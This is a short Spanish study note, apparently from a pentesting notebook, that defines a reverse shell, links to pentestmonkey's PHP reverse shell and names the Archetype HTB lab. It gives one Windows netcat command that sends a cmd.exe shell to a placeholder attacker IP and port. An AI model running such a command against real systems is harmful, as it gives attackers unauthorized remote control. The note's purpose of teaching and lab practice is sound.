Es aquella que se obtiene cuando es la máquina víctima la que trata de establecer la conexión con nuestra máquina de atacante (que estaría en escucha). Es lo opuesto a una [[Bind shell]].

# Ejemplos

La mejor página para buscar reverse shells es [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

## Linux

### php



## Windows

### nc64.exe

Utilizando el binario de netcat para windows x64 podemos mandarnos una reverse shell. Se utiliza en [[Archetype HTB]].

```powershell
.\nc64.exe -e cmd.exe <ip> <port>
```

Con el parámetro `-e` indicamos que queremos ejecutar un archivo al conectarnos, en este caso una cmd.